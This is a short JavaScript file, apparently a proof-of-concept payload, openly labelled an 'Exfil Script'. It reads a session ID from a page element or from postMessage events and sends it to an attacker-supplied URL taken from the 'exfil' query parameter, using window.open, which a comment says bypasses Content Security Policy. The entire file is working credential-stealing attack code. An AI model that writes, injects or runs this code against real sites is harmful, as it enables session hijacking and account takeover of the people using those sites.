  (function() {                                                                                                                                        
      const urlParams = new URLSearchParams(window.location.search);                                                                                   
      const exfilUrl = urlParams.get('exfil');                                                                                                         
      const fromContext = urlParams.get('from');                                                                                                       
                                                                                                                                                       
      console.log('[Exfil Script] Loaded - Searching for Session ID...');                                                                              
      console.log('[Exfil Script] Exfil URL:', exfilUrl);                                                                                              
      console.log('[Exfil Script] From context:', fromContext);                                                                                        
                                                                                                                                                       
      // Method 1: Read from DOM                                                                                                                       
      const sessionIdInput = document.getElementById('apiSessionId');                                                                                  
      if (sessionIdInput && sessionIdInput.value) {                                                                                                    
          console.log('[EXFIL] Found Session ID in DOM:', sessionIdInput.value);                                                                       
          exfiltrate(sessionIdInput.value, fromContext || 'dom');                                                                                      
      } else {                                                                                                                                         
          console.log('[EXFIL] No Session ID found in DOM');                                                                                           
      }                                                                                                                                                
                                                                                                                                                       
      // Method 2: Listen for postMessage                                                                                                              
      console.log('[Exfil Script] Listening for postMessage...');                                                                                      
      window.addEventListener('message', function(event) {                                                                                             
          if (event.data && event.data.type === 'sessionId' && event.data.value) {                                                                     
              console.log('[EXFIL] Received Session ID via postMessage:', event.data.value);                                                           
              exfiltrate(event.data.value, 'postmessage');                                                                                             
          }                                                                                                                                            
      });                                                                                                                                              
                                                                                                                                                       
      function exfiltrate(data, source) {                                                                                                              
          if (!exfilUrl) {                                  
              console.log('[EXFIL] No exfil URL provided, data captured but not sent:', data);                                                         
              return;                                                                                                                                  
          }                                                                                                                                            
                                                                                                                                                       
          console.log('[EXFIL] Attempting exfiltration...');                                                                                           
                                                                                                                                                       
          // Method: window.open (bypasses CSP)                                                                                                        
          try {                                             
              const url = exfilUrl + encodeURIComponent(data) + '&source=' + source;                                                                   
              window.open(url, '_blank');                                                                                                              
              console.log('[EXFIL] window.open executed:', url);                                                                                       
          } catch(e) {                                                                                                                                 
              console.error('[EXFIL] window.open failed:', e);                                                                                         
          }                                                                                                                                            
      }                                                                                                                                                
  })(); 
